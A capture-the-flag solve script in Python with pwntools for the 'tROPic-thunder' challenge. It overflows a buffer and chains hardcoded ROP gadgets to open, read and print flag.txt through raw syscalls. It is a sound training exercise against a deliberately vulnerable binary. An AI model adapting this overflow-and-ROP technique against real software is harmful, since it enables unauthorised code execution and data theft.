from pwn import *

# Gadgets:
offset = b'i'*120
writable = 0x6d6500
mov_ptr_rsi_rax = 0x48e831
pop_rdi = 0x4006a6
pop_rsi = 0x40165c
pop_rdx = 0x4589f5
pop_rax = 0x4005af
syscall_ret = 0x0000000000484105
ret = 0x0000000000400416

io = process('./tROPic-thunder')
#gdb.attach(io, api=True)
#io = remote('thunder.sdc.tf', 1337)

payload = offset
# Write flag.txt to program
payload += p64(pop_rax) + b'flag.txt'
payload += p64(pop_rsi) + p64(writable)
payload += p64(mov_ptr_rsi_rax)

# payload += p64(pop_rax) + b'swd\0\0\0\0\0'
# payload += p64(pop_rsi) + p64(writable + 8)
# payload += p64(mov_ptr_rsi_rax)

# 2nd chain to open -> read -> write flag.txt
# Open
payload += p64(pop_rax) + p64(2) #Syscall for open
payload += p64(pop_rdi) + p64(writable) #Address of string flag.txt
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(ret)
payload += p64(syscall_ret)

# Read
payload += p64(pop_rdi) + p64(3) #Guess fd = 3
payload += p64(pop_rax) + p64(0) #Syscall for read
payload += p64(pop_rsi) + p64(writable) #Address to write content of flag.txt to
payload += p64(pop_rdx) + p64(100) #Read 100 characters
payload += p64(ret)
payload += p64(syscall_ret)

# Write
payload += p64(pop_rax) + p64(1) #Syscall for write
payload += p64(pop_rdi) + p64(2) #Write to stdout
payload += p64(pop_rsi) + p64(writable) #Address to print content of flag.txt from
payload += p64(pop_rdx) + p64(100) #Print 100 characters
payload += p64(ret)
payload += p64(syscall_ret)

#payload += p64(ret)
payload += p64(0x0000000000400bf2) # Main

io.recvuntil(b'one!\n')
io.sendline(payload)
io.interactive()
